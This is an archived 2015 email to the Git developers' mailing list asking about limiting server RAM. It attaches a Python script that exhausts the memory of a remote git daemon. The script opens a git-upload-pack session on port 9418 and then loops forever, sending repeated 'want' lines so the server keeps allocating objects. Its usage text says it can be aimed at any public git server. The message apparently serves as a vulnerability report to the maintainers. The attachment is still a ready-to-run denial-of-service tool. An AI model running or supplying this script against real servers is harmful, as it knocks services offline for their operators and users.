From: ytrezq@sdf-eu.org
Subject: arbitrary memory allocation
Date: Thu, 26 Nov 2015 05:06:35 +0100
Message-ID: <1a012fc79a55cae8b948b28d1259be0c.squirrel@sdfeu.org>
Reply-To: ytrezq@sdf-eu.org
Mime-Version: 1.0
Content-Type: multipart/mixed;boundary="----=_20151126050635_37662"
To: git@vger.kernel.org
X-From: git-owner@vger.kernel.org Thu Nov 26 05:20:58 2015
Return-path: <git-owner@vger.kernel.org>
Envelope-to: gcvg-git-2@plane.gmane.org
Received: from vger.kernel.org ([209.132.180.67])
	by plane.gmane.org with esmtp (Exim 4.69)
	(envelope-from <git-owner@vger.kernel.org>)
	id 1a1o3F-0003Md-5S
	for gcvg-git-2@plane.gmane.org; Thu, 26 Nov 2015 05:20:57 +0100
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id S1752322AbbKZEUt (ORCPT <rfc822;gcvg-git-2@m.gmane.org>);
	Wed, 25 Nov 2015 23:20:49 -0500
Received: from odin.sdf-eu.org ([178.63.35.194]:49705 "EHLO sdfeu.org"
	rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
	id S1752272AbbKZEUs (ORCPT <rfc822;git@vger.kernel.org>);
	Wed, 25 Nov 2015 23:20:48 -0500
X-Greylist: delayed 491 seconds by postgrey-1.27 at vger.kernel.org; Wed, 25 Nov 2015 23:20:48 EST
Received: from sdfeu.org (IDENT:www@odin.sdf-eu.org [178.63.35.194])
	by sdfeu.org (8.14.8/8.14.3) with ESMTP id tAQ46ZXH025661
	for <git@vger.kernel.org>; Thu, 26 Nov 2015 04:06:35 GMT
Received: from 24.41.74.86.rev.sfr.net ([86.74.41.24])
        (SquirrelMail authenticated user ytrezq)
        by sdfeu.org with HTTP;
        Thu, 26 Nov 2015 05:06:35 +0100
User-Agent: SquirrelMail/1.4.21
X-Priority: 1 (Highest)
Importance: High
Sender: git-owner@vger.kernel.org
Precedence: bulk
List-ID: <git.vger.kernel.org>
X-Mailing-List: git@vger.kernel.org
Archived-At: <http://permalink.gmane.org/gmane.comp.version-control.git/281754>

------=_20151126050635_37662
Content-Type: text/plain; charset="iso-8859-1"
Content-Transfer-Encoding: 8bit

Hello,

First, something I still don t understand, should I always ulimit ram
usage for security purposes when I m manage a public server?

If not, you may find the attachment interesting
------=_20151126050635_37662
Content-Type: text/x-python; name="git-clone.py"
Content-Transfer-Encoding: 8bit
Content-Disposition: attachment; filename="git-clone.py"

#!/usr/bin/python
from socket import *
import sys,time
if len(sys.argv)!=3:
	print "Ok, it is not a real memory leak but it can be used against any public git server.\nAn http version of this script would benefit from a large zlib compression ratio allowing to fill the ram 200 time faster like with ssh"
	print ""
	print "usage"
	print "argv1 is the target domain name or address"
	print "argv2 is the path to a non empty repo with at least 2 refs"
	print ""
	print "for example git://somesite.com/git/linux.git would become"
	print sys.argv[0] + " somesite.com /git/linux.git"
	exit(1)

sockobj = socket(AF_INET, SOCK_STREAM)
sockobj.connect((sys.argv[1],9418))
path="git-upload-pack "+sys.argv[2]+"\0host="+sys.argv[1]+'\0' # request a clone
sockobj.send(format(len(path)+4,'04x')+path) # see the git documentation for more information about the pkt-line format

# Even when blocking, socket.recv might not send the complete request size
def full_read(length):
	buf=sockobj.recv(length)
	size=length-len(buf)
	while size>0:
		time.sleep(0.001) # wait for data to arrive
		buf+=sockobj.recv(size)
		size=size-len(buf)
	return buf

obj=[full_read(int(full_read(4),16)-4)]
pkt_line_length=int(sockobj.recv(4),16)-4 # represent the lenght of a packet in pkt-line format (in hex on 4 ascii bytes)
while pkt_line_length>0:
	obj.append(full_read(pkt_line_length))
	pkt_line_length=int(full_read(4),16)-4
	if sys.getsizeof(obj)>150000: # Don t do the same error of the official git project, limit our ram usage
		time.sleep(1)
		sockobj.recv(10000) # be sure git-upload-pack would be ready for recieving
		break

first_line="want "+obj[0][:40]+" multi_ack_detailed side-band-64k thin-pack ofs-delta agent=git/2.9.2\n" # The first line have a different format
sockobj.send(format(len(first_line)+4,'04x')+first_line) # send it in the pkt-line format

line_list="0032want "+obj[1][:40]+'\n'
while len(line_list)<65430: # Get the ideal tcp packet size for fastest bandwidth (64Ko)
	for i in obj:
		if (i==obj[0]) or (i==obj[1]) or ("pull" in i):
			continue
		line_list+="0032want "+i[:40]+'\n'
		if len(line_list)>65480:
			break


# struct object (see object.h line 47)
# unsigned int
# unsigned int
# unsigned int
# unsigned int
# unsigned char binary_sha[20]

# objects=object +
# char *=NULL (64 bit int)
# char *=NULL (64 bit int)
# unsigned mode
line_list_len=line_list.count('\n')*56 # Line lengths of the pkt-line format won t fill the ram, so remove them from the size counter
count=line_list_len
while True:
	sys.stdout.flush()
	sockobj.send(line_list) # for each line, the git-send-pack process allocate append a member to a struct objects array
	print("\r%.2f Mo of ram filled" % float(count/float(1048576))),
	count+=line_list_len
------=_20151126050635_37662--
